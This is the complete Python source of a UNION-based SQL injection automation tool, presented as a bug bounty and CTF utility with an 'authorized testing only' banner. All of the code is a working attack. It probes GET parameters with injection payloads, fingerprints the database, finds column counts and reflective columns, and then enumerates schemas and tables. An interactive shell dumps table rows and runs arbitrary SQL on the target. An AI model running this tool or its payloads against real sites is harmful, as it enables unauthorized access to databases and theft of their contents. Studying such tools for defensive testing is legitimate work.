#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║         Advanced UNION SQLi Automation Tool  v1.0            ║
║         For authorized penetration testing only              ║
╠══════════════════════════════════════════════════════════════╣
║  Author   :  Hasrat Afridi                                   ║
║  Purpose  :  Bug Bounty / CTF / Authorized Pentesting        ║
╚══════════════════════════════════════════════════════════════╝

Usage: sqli -u "https://target.com/page?id=1"
       sqli              (interactive mode)
"""

import requests
import argparse
import sys
import re
import time
import json
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

# Enable better CLI input (backspace, history, etc.)
try:
    import readline
    readline.parse_and_bind("tab: complete")
except ImportError:
    pass

# ─── Color codes ────────────────────────────────────────────
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    CYAN    = "\033[96m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"
    DIM     = "\033[2m"

def ok(msg):    print(f"{C.GREEN}[+]{C.RESET} {msg}")
def info(msg):  print(f"{C.CYAN}[*]{C.RESET} {msg}")
def warn(msg):  print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def err(msg):   print(f"{C.RED}[-]{C.RESET} {msg}")
def hdr(msg):   print(f"\n{C.BOLD}{C.BLUE}{msg}{C.RESET}\n{'─'*50}")

BANNER = f"""
{C.BOLD}{C.CYAN}
 ███████╗ ██████╗ ██╗     ██╗    ████████╗ ██████╗  ██████╗ ██╗     
 ██╔════╝██╔═══██╗██║     ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
 ███████╗██║   ██║██║     ██║       ██║   ██║   ██║██║   ██║██║     
 ╚════██║██║▄▄ ██║██║     ██║       ██║   ██║   ██║██║   ██║██║     
 ███████║╚██████╔╝███████╗██║       ██║   ╚██████╔╝╚██████╔╝███████╗
 ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
{C.RESET}\
{C.DIM}
 ┌─────────────────────────────────────────────────────────────┐
 │  Tool     :  Advanced UNION-Based SQL Injection Tool  v1.0  │
 │  Author   :  Hasrat Afridi                                  │
 │  Mode     :  Bug Bounty · CTF · Authorized Pentesting       │
 │  Warning  :  Use only on systems you have permission to test │
 └─────────────────────────────────────────────────────────────┘
{C.RESET}"""

# ─── Common error signatures across DB engines ──────────────
ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    # MSSQL
    "unclosed quotation mark",
    "microsoft ole db",
    "odbc sql server driver",
    "syntax error converting",
    # Oracle
    "ora-00907",
    "ora-00933",
    "oracle error",
    # PostgreSQL
    "pg_query",
    "unterminated quoted string",
    "postgresql",
    # SQLite
    "sqlite_",
    "sqlite3.operationalerror",
    # Generic
    "sql syntax",
    "syntax error",
    "database error",
    "invalid query",
    "supplied argument is not a valid",
]

DB_FINGERPRINTS = {
    "MySQL":      ["mysql", "you have an error in your sql syntax", "mysql_fetch"],
    "MSSQL":      ["microsoft", "odbc", "sql server", "mssql"],
    "Oracle":     ["ora-", "oracle"],
    "PostgreSQL": ["postgresql", "pg_"],
    "SQLite":     ["sqlite"],
}


class SQLiTool:
    def __init__(self, url, delay=0.3, verbose=False, timeout=15):
        self.raw_url   = url
        self.delay     = delay
        self.verbose   = verbose
        self.timeout   = timeout
        self.session   = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })

        # Parse URL → inject into each GET param individually
        parsed = urlparse(url)
        self.base      = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        self.params    = parse_qs(parsed.query, keep_blank_values=True)
        self.inject_param = None   # discovered injectable param
        self.db_type   = "Unknown"
        self.col_count = None
        self.visible_col = None
        self.baseline_len = None

        if not self.params:
            err("No GET parameters found in the URL.")
            err("Example: http://site.com/page?id=1")
            sys.exit(1)

    # ── Low-level request ────────────────────────────────────
    def _get(self, param, value):
        """Send request with one param injected."""
        params = {k: v[0] for k, v in self.params.items()}
        params[param] = value
        try:
            time.sleep(self.delay)
            r = self.session.get(self.base, params=params, timeout=self.timeout)
            if self.verbose:
                info(f"GET {r.url}  →  HTTP {r.status_code}  ({len(r.text)} bytes)")
            return r
        except requests.exceptions.ConnectionError:
            err("Connection refused / host unreachable.")
            sys.exit(1)
        except requests.exceptions.Timeout:
            err("Request timed out.")
            sys.exit(1)
        except Exception as e:
            err(f"Unexpected error: {e}")
            sys.exit(1)

    # ── Error detection ──────────────────────────────────────
    def _has_error(self, r):
        text_lower = r.text.lower()
        return r.status_code >= 500 or any(sig in text_lower for sig in ERROR_SIGNATURES)

    # ── DB fingerprint ───────────────────────────────────────
    def fingerprint_db(self):
        hdr("Step 0 — Database Fingerprint")
        probe = "'"
        for param in self.params:
            original = self.params[param][0]
            r = self._get(param, original + probe)
            low = r.text.lower()
            for db, sigs in DB_FINGERPRINTS.items():
                if any(s in low for s in sigs):
                    self.db_type = db
                    ok(f"Database detected: {C.BOLD}{db}{C.RESET}")
                    return
        warn("Could not fingerprint DB — defaulting to generic MySQL syntax.")

    # ── Injectable param discovery ───────────────────────────
    def find_injectable_param(self):
        hdr("Step 1 — Parameter Discovery")
        info(f"Testing {len(self.params)} parameter(s): {list(self.params.keys())}")

        for param in self.params:
            original = self.params[param][0]
            info(f"Testing param: {C.BOLD}{param}{C.RESET}")

            # Baseline
            r_base = self._get(param, original)
            self.baseline_len = len(r_base.text)

            # Quote test
            r_quote = self._get(param, original + "'")
            if self._has_error(r_quote):
                ok(f"Param '{param}' triggers SQL error — injectable!")
                self.inject_param = param
                return True

            # True/false boolean test
            r_true  = self._get(param, original + " AND 1=1--")
            r_false = self._get(param, original + " AND 1=2--")
            if len(r_true.text) != len(r_false.text):
                ok(f"Param '{param}' shows boolean difference — injectable!")
                self.inject_param = param
                return True

        err("No injectable parameter found automatically.")
        warn("Try supplying the param manually or check if the app uses POST.")
        return False

    # ── Column count ─────────────────────────────────────────
    def find_columns(self, max_cols=20):
        hdr("Step 2 — Column Count (ORDER BY)")
        original = self.params[self.inject_param][0]

        for i in range(1, max_cols + 1):
            payload = f"' ORDER BY {i}--"
            r = self._get(self.inject_param, original + payload)

            if self._has_error(r):
                self.col_count = i - 1
                ok(f"Column count: {C.BOLD}{self.col_count}{C.RESET}")
                return self.col_count

        # Fallback: GROUP BY
        warn("ORDER BY failed — trying GROUP BY...")
        for i in range(1, max_cols + 1):
            payload = f"' GROUP BY {i}--"
            r = self._get(self.inject_param, original + payload)
            if self._has_error(r):
                self.col_count = i - 1
                ok(f"Column count (GROUP BY): {C.BOLD}{self.col_count}{C.RESET}")
                return self.col_count

        err("Could not determine column count.")
        return None

    # ── UNION validity ───────────────────────────────────────
    def test_union(self):
        hdr("Step 3 — UNION SELECT Validation")
        original = self.params[self.inject_param][0]
        nulls    = ",".join(["NULL"] * self.col_count)
        payload  = f"' UNION SELECT {nulls}--"
        r = self._get(self.inject_param, original + payload)

        if r.status_code == 200 and not self._has_error(r):
            ok("UNION SELECT is valid!")
            return True

        err("UNION SELECT failed (may need -- vs #, or different NULL style).")
        return False

    # ── Visible column ───────────────────────────────────────
    def find_visible_column(self):
        hdr("Step 4 — Visible Column Detection")
        original = self.params[self.inject_param][0]
        MARKER   = "SQLI_MARKER_XYZ"

        for i in range(self.col_count):
            cols    = ["NULL"] * self.col_count
            cols[i] = f"'{MARKER}'"
            payload = f"' UNION SELECT {','.join(cols)}--"
            r = self._get(self.inject_param, original + payload)

            if MARKER in r.text:
                self.visible_col = i
                ok(f"Visible column at position: {C.BOLD}{i+1}{C.RESET}")
                return i

        err("No string-reflective column found.")
        return None

    # ── Build injection payload ──────────────────────────────
    def _inject(self, sql_expr):
        original = self.params[self.inject_param][0]
        cols     = ["NULL"] * self.col_count
        cols[self.visible_col] = sql_expr
        payload  = f"' UNION SELECT {','.join(cols)}--"
        return self._get(self.inject_param, original + payload)

    # ── Auto-extract recon info ──────────────────────────────
    def auto_recon(self):
        hdr("Step 5 — Automatic Recon")

        queries = {
            "DB Version":  "@@version" if self.db_type != "Oracle" else "banner FROM v$version WHERE ROWNUM=1--",
            "Current DB":  "database()" if self.db_type not in ("Oracle", "MSSQL") else "db_name()",
            "Current User":"user()"     if self.db_type != "MSSQL" else "system_user",
            "Hostname":    "@@hostname",
            "Data Directory": "@@datadir",
        }

        results = {}
        for label, expr in queries.items():
            try:
                r = self._inject(expr)
                # Pull the injected value out of the response
                val = self._extract_value(r.text)
                results[label] = val or "(not reflected)"
                ok(f"{label:20s}: {C.BOLD}{val or '(not reflected)'}{C.RESET}")
            except Exception:
                results[label] = "error"

        return results

    def _extract_value(self, html):
        """
        Very naive extractor: looks for content between common tags
        or just returns the first non-empty line that changed.
        """
        # Try to find value in <td>, <p>, <div>, <span>, <h1>-<h3>
        for tag in ["td", "p", "li", "span", "div", "h1", "h2", "h3"]:
            matches = re.findall(rf"<{tag}[^>]*>\s*([^<{{}}]+?)\s*</{tag}>", html, re.IGNORECASE)
            for m in matches:
                m = m.strip()
                if m and len(m) < 300 and m not in ("", " "):
                    return m
        return None

    # ── List all databases ───────────────────────────────────
    def list_databases(self):
        hdr("Databases")
        r = self._inject("GROUP_CONCAT(schema_name SEPARATOR ', ') FROM information_schema.schemata--")
        val = self._extract_value(r.text)
        if val:
            dbs = [d.strip() for d in val.split(",")]
            for db in dbs:
                ok(f"  Database: {C.BOLD}{db}{C.RESET}")
            return dbs
        else:
            warn("Could not list databases — printing raw response snippet:")
            print(r.text[:1500])
            return []

    # ── List tables in a DB ──────────────────────────────────
    def list_tables(self, database):
        hdr(f"Tables in '{database}'")
        expr = f"GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema='{database}'--"
        r = self._inject(expr)
        val = self._extract_value(r.text)
        if val:
            tables = [t.strip() for t in val.split(",")]
            for t in tables:
                ok(f"  Table: {C.BOLD}{t}{C.RESET}")
            return tables
        else:
            warn("Could not list tables.")
            print(r.text[:1500])
            return []

    # ── List columns in a table ──────────────────────────────
    def list_columns(self, database, table):
        hdr(f"Columns in '{database}'.'{table}'")
        expr = (f"GROUP_CONCAT(column_name,':',data_type ORDER BY ordinal_position SEPARATOR ', ') "
                f"FROM information_schema.columns "
                f"WHERE table_schema='{database}' AND table_name='{table}'--")
        r = self._inject(expr)
        val = self._extract_value(r.text)
        if val:
            cols = [c.strip() for c in val.split(",")]
            for c in cols:
                ok(f"  Column: {C.BOLD}{c}{C.RESET}")
            return [c.split(":")[0] for c in cols]
        else:
            warn("Could not list columns.")
            print(r.text[:1500])
            return []

    # ── Dump table data ──────────────────────────────────────
    def dump_table(self, database, table, columns, limit=10):
        hdr(f"Dumping '{table}' (first {limit} rows)")
        col_list = ",0x7c,".join(columns)    # 0x7c = pipe char separator
        expr     = (f"GROUP_CONCAT({col_list} ORDER BY 1 SEPARATOR '|||') "
                    f"FROM {database}.{table} LIMIT {limit}--")
        r = self._inject(expr)
        val = self._extract_value(r.text)
        if val:
            rows = val.split("|||")
            for i, row in enumerate(rows, 1):
                cells = row.split("|")
                row_data = dict(zip(columns, cells))
                print(f"\n  {C.DIM}Row {i}{C.RESET}")
                for col, cell in row_data.items():
                    print(f"    {C.CYAN}{col}{C.RESET}: {cell}")
        else:
            warn("Could not dump table.")
            print(r.text[:2000])

    # ── Raw SQL mode ─────────────────────────────────────────
    def raw_query(self, sql_expr):
        hdr("Raw Query Result")
        r = self._inject(sql_expr)
        val = self._extract_value(r.text)
        if val:
            ok(f"Result: {C.BOLD}{val}{C.RESET}")
        else:
            warn("Value not directly extracted — raw response (first 2000 chars):")
            print(r.text[:2000])


# ─── Interactive Shell ───────────────────────────────────────
HELP_TEXT = f"""
{C.BOLD}Available commands:{C.RESET}

  {C.CYAN}dbs{C.RESET}                          List all databases
  {C.CYAN}use <db>{C.RESET}                     Set active database
  {C.CYAN}tables{C.RESET}                       List tables in active DB
  {C.CYAN}columns <table>{C.RESET}              List columns in table
  {C.CYAN}dump <table> [col1 col2...]{C.RESET}  Dump table rows
  {C.CYAN}query <SQL expression>{C.RESET}       Run custom SQL expression
  {C.CYAN}recon{C.RESET}                        Re-run auto recon
  {C.CYAN}help{C.RESET}                         Show this help
  {C.CYAN}exit{C.RESET}                         Quit
"""

def interactive_shell(tool):
    hdr("Interactive Shell — Type 'help' for commands")
    active_db = None

    while True:
        try:
            db_label = f"{C.DIM}({active_db}){C.RESET} " if active_db else ""
            raw = input(f"\n{C.BOLD}{C.GREEN}sqli{C.RESET} {db_label}{C.BOLD}>{C.RESET} ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n")
            ok("Exiting shell.")
            break

        if not raw:
            continue

        parts = raw.split()
        cmd   = parts[0].lower()

        if cmd == "exit":
            ok("Bye!")
            break

        elif cmd == "help":
            print(HELP_TEXT)

        elif cmd == "dbs":
            tool.list_databases()

        elif cmd == "use" and len(parts) >= 2:
            active_db = parts[1]
            ok(f"Active DB set to: {C.BOLD}{active_db}{C.RESET}")

        elif cmd == "tables":
            if not active_db:
                warn("Run 'use <database>' first.")
            else:
                tool.list_tables(active_db)

        elif cmd == "columns" and len(parts) >= 2:
            table = parts[1]
            if not active_db:
                warn("Run 'use <database>' first.")
            else:
                tool.list_columns(active_db, table)

        elif cmd == "dump" and len(parts) >= 2:
            table   = parts[1]
            columns = parts[2:] if len(parts) > 2 else None
            if not active_db:
                warn("Run 'use <database>' first.")
            else:
                if not columns:
                    columns = tool.list_columns(active_db, table)
                if columns:
                    tool.dump_table(active_db, table, columns)

        elif cmd == "recon":
            tool.auto_recon()

        elif cmd == "query" and len(parts) >= 2:
            expr = " ".join(parts[1:])
            tool.raw_query(expr)

        else:
            warn(f"Unknown command: '{cmd}'. Type 'help' for usage.")


# ─── Main ────────────────────────────────────────────────────
def main():
    # Always print banner first
    print(BANNER)

    # ── If -u flag given, use it directly (old behavior) ─────
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            description="Advanced UNION SQLi Automation Tool",
            formatter_class=argparse.RawDescriptionHelpFormatter,
        )
        parser.add_argument("-u", "--url",     required=True, help="Target URL with GET parameter(s)")
        parser.add_argument("-d", "--delay",   type=float, default=0.3, help="Delay between requests in seconds")
        parser.add_argument("-t", "--timeout", type=int,   default=15,  help="HTTP timeout in seconds")
        parser.add_argument("-v", "--verbose", action="store_true",     help="Show every request URL")
        args = parser.parse_args()
        target_url = args.url
        delay      = args.delay
        timeout    = args.timeout
        verbose    = args.verbose
    else:
        # ── Interactive startup — banner, help menu, then URL ──
        print(f"{C.BOLD}{C.CYAN}  Welcome to SQLi Tool — Authorized Testing Only{C.RESET}")
        print(f"{C.DIM}  ─────────────────────────────────────────────{C.RESET}\n")

        print(f"""  {C.BOLD}USAGE{C.RESET}
    {C.CYAN}sqli{C.RESET}                          Interactive mode (this menu)
    {C.CYAN}sqli -u{C.RESET} <url>               Direct mode — skip prompts
    {C.CYAN}sqli -u{C.RESET} <url> {C.CYAN}-v{C.RESET}            Verbose — show every request
    {C.CYAN}sqli -u{C.RESET} <url> {C.CYAN}-d{C.RESET} 0.5        Custom delay (seconds)

  {C.BOLD}SHELL COMMANDS{C.RESET} {C.DIM}(available after injection confirmed){C.RESET}
    {C.CYAN}dbs{C.RESET}                          List all databases
    {C.CYAN}use{C.RESET} <db>                    Set active database
    {C.CYAN}tables{C.RESET}                       List tables in active DB
    {C.CYAN}columns{C.RESET} <table>              List columns in table
    {C.CYAN}dump{C.RESET} <table> [col1 col2]    Dump rows from table
    {C.CYAN}query{C.RESET} <SQL expression>       Run custom SQL expression
    {C.CYAN}recon{C.RESET}                        Re-run auto recon
    {C.CYAN}help{C.RESET}                         Show this help again
    {C.CYAN}exit{C.RESET}                         Quit

  {C.DIM}─────────────────────────────────────────────{C.RESET}
""")

        # URL prompt — handles help/exit/invalid input
        while True:
            try:
                target_url = input(f"  {C.BOLD}{C.GREEN}Target URL{C.RESET} {C.DIM}(type \'help\' or \'exit\'){C.RESET}\n  {C.BOLD}>{C.RESET} ").strip()
            except (KeyboardInterrupt, EOFError):
                print("\n\n  Bye!\n")
                sys.exit(0)

            if target_url.lower() == "exit":
                print("\n  Bye!\n")
                sys.exit(0)
            elif target_url.lower() == "help":
                print(f"""
  {C.BOLD}USAGE{C.RESET}
    {C.CYAN}sqli{C.RESET}                   Interactive mode
    {C.CYAN}sqli -u{C.RESET} <url>          Direct mode
    {C.CYAN}sqli -u{C.RESET} <url> {C.CYAN}-v{C.RESET}       Verbose mode
    {C.CYAN}sqli -u{C.RESET} <url> {C.CYAN}-d{C.RESET} 0.5   Custom delay

  {C.BOLD}SHELL COMMANDS{C.RESET}
    {C.CYAN}dbs / use / tables / columns / dump / query / recon / exit{C.RESET}
""")
                continue
            elif not target_url or not target_url.startswith("http"):
                warn("Please enter a valid URL starting with http:// or https://")
                continue
            else:
                break

        # Optional settings
        print(f"\n  {C.DIM}Press Enter to use defaults, or type a value.{C.RESET}")
        try:
            delay_in   = input(f"  {C.DIM}Delay between requests (default 0.3s):{C.RESET} ").strip()
            verbose_in = input(f"  {C.DIM}Verbose mode? (y/N):{C.RESET} ").strip().lower()
        except (KeyboardInterrupt, EOFError):
            delay_in   = ""
            verbose_in = ""

        delay   = float(delay_in) if delay_in else 0.3
        verbose = verbose_in == "y"
        timeout = 15

        print()

    # ── Build tool instance ───────────────────────────────────
    tool = SQLiTool(
        url     = target_url,
        delay   = delay,
        verbose = verbose,
        timeout = timeout,
    )

    # ── Auto-discovery phase ──────────────────────────────────
    tool.fingerprint_db()

    if not tool.find_injectable_param():
        err("Aborting — no injectable param found.")
        sys.exit(1)

    cols = tool.find_columns()
    if not cols:
        err("Aborting — cannot determine column count.")
        sys.exit(1)

    if not tool.test_union():
        err("Aborting — UNION SELECT not usable.")
        sys.exit(1)

    if tool.find_visible_column() is None:
        err("Aborting — no string-reflective column.")
        sys.exit(1)

    tool.auto_recon()

    # ── Hand off to interactive shell ─────────────────────────
    interactive_shell(tool)


if __name__ == "__main__":
    main()
